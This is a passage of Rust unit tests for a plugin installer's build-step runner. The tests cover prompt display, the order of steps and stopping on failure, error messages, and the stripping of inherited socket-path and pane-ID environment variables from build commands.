        {
            std::thread::sleep(std::time::Duration::from_millis(20));
        }
        assert_eq!(
            std::sync::Arc::strong_count(&out.0),
            1,
            "the stdout reader is still reading"
        );
        assert_eq!(
            std::sync::Arc::strong_count(&err.0),
            1,
            "the stderr reader is still reading"
        );
        assert_eq!(out.text(), "building\nbuilt\n");
        assert_eq!(err.text(), "");
    }

    /// A prompt with no newline after it (npx's `Ok to proceed? (y)`) shows while the step waits.
    #[test]
    fn a_build_steps_prompt_without_a_newline_shows_while_it_waits() {
        let dir = tempfile::tempdir().unwrap();
        let go = dir.path().join("go");
        let mut cmd = std::process::Command::new("sh");
        cmd.args([
            "-c",
            "printf 'Ok to proceed? (y) '; i=0; while [ ! -e go ] && [ $i -lt 600 ]; do sleep 0.05; i=$((i+1)); done",
        ])
        .current_dir(dir.path());
        let out = Kept::default();
        let shown = out.clone();
        let run = std::thread::spawn(move || {
            run_passing_output(&mut cmd, Box::new(out), Box::new(Kept::default())).unwrap()
        });
        let deadline = std::time::Instant::now() + std::time::Duration::from_secs(20);
        while !shown.text().contains("Ok to proceed? (y) ") && std::time::Instant::now() < deadline
        {
            std::thread::sleep(std::time::Duration::from_millis(20));
        }
        let seen = shown.text();
        std::fs::write(&go, "").unwrap();
        let (status, tail) = run.join().unwrap();
        assert_eq!(
            seen, "Ok to proceed? (y) ",
            "the prompt did not show while the step waited"
        );
        assert!(status.success());
        assert_eq!(tail, ["Ok to proceed? (y)"]);
    }

    #[test]
    fn run_build_commands_runs_steps_in_order_and_stops_on_failure() {
        let dir = tempfile::tempdir().unwrap();
        let marker = dir.path().join("marker");
        let manifest = manifest::parse(&format!(
            r#"
id = "x"
version = "1.0.0"
min_herdr_version = "0.7.0"

[[build]]
command = ["sh", "-c", "touch {marker}"]

[[build]]
command = ["sh", "-c", "exit 3"]

[[build]]
command = ["sh", "-c", "touch {never}"]
"#,
            marker = marker.display(),
            never = dir.path().join("never").display(),
        ))
        .unwrap();

        let err = run_build_commands(&manifest, dir.path()).unwrap_err();
        assert!(err.to_string().contains("build[1]"));
        assert!(
            err.downcast_ref::<InstallError>()
                .is_some_and(|e| matches!(e, InstallError::BuildFailed { step: 1, .. }))
        );
        assert!(marker.exists());
        assert!(!dir.path().join("never").exists());
    }

    #[test]
    fn a_build_that_is_not_installed_says_so_and_a_failed_one_shows_its_last_lines() {
        let dir = tempfile::tempdir().unwrap();
        let build = |command: &str| {
            manifest::parse(&format!(
                "id = \"x\"\nversion = \"1.0.0\"\nmin_herdr_version = \"0.7.0\"\n\n[[build]]\ncommand = {command}\n"
            ))
            .unwrap()
        };
        let missing = build("[\"taw-no-such-program-xyz\", \"ci\"]");
        let err = run_build_commands(&missing, dir.path()).unwrap_err();
        let message = format!("{err:#}");
        assert!(message.starts_with("plugin_build_failed:"), "{message}");
        assert!(
            message.contains("taw-no-such-program-xyz: command not found"),
            "{message}"
        );

        let failing = build("[\"sh\", \"-c\", \"echo compiling; echo boom >&2; exit 1\"]");
        let err = run_build_commands(&failing, dir.path()).unwrap_err();
        let message = format!("{err:#}");
        assert!(message.contains("build[0]"), "{message}");
        assert!(message.contains("failed (exit status: 1)"), "{message}");
        assert!(
            message.contains("compiling") && message.contains("boom"),
            "{message}"
        );
    }

    #[test]
    fn run_build_commands_strips_herdr_socket_path_even_when_inherited_from_the_parent_process() {
        let _guard = SOCKET_ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        // SAFETY: serialized by SOCKET_ENV_LOCK, shared with env.rs's run_sync/
        // spawn_detached counterparts, same two var names, one lock, so none of these can
        // race each other across files/threads.
        unsafe {
            std::env::set_var("HERDR_SOCKET_PATH", "/tmp/should-not-leak-build.sock");
            std::env::set_var("TAW_SOCKET_PATH", "/tmp/should-not-leak-build-taw.sock");
        }
        let dir = tempfile::tempdir().unwrap();
        // `run_build_commands` inherits stdio straight to the terminal rather than
        // capturing it (see its doc comment), so the build command redirects its own `env`
        // dump to a file instead of relying on captured stdout.
        let dump = dir.path().join("env-dump.txt");
        let manifest = manifest::parse(&format!(
            r#"
id = "x"
version = "1.0.0"
min_herdr_version = "0.7.0"

[[build]]
command = ["sh", "-c", "env > {dump}"]
"#,
            dump = dump.display(),
        ))
        .unwrap();

        let result = run_build_commands(&manifest, dir.path());
        // SAFETY: still serialized by SOCKET_ENV_LOCK.
        unsafe {
            std::env::remove_var("HERDR_SOCKET_PATH");
            std::env::remove_var("TAW_SOCKET_PATH");
        }
        result.unwrap();

        let contents = std::fs::read_to_string(&dump).unwrap();
        assert!(
            !contents.contains("HERDR_SOCKET_PATH"),
            "HERDR_SOCKET_PATH leaked into a build command's environment:\n{contents}"
        );
        assert!(
            !contents.contains("TAW_SOCKET_PATH"),
            "TAW_SOCKET_PATH leaked into a build command's environment:\n{contents}"
        );
    }

    #[test]
    fn run_build_commands_strip_inherited_pane_ids() {
        let _guard = SOCKET_ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        // SAFETY: serialized by SOCKET_ENV_LOCK, which every test that sets one of these takes.
        unsafe {
            for name in env::PANE_CONTEXT_VARS {
                std::env::set_var(name, "%calling");
            }
        }
        let dir = tempfile::tempdir().unwrap();
        let dump = dir.path().join("ids.txt");
        let manifest = manifest::parse(&format!(
            r#"
id = "x"
version = "1.0.0"
min_herdr_version = "0.7.0"

[[build]]
command = ["sh", "-c", "printf '%s|%s' \"${{HERDR_PANE_ID-unset}}\" \"${{TAW_TAB_ID-unset}}\" > {dump}"]
"#,
            dump = dump.display(),
        ))
        .unwrap();
        let result = run_build_commands(&manifest, dir.path());
        // SAFETY: still serialized by SOCKET_ENV_LOCK.
        unsafe {
            for name in env::PANE_CONTEXT_VARS {
                std::env::remove_var(name);
            }
        }
        result.unwrap();
        assert_eq!(std::fs::read_to_string(&dump).unwrap(), "unset|unset");
    }
}
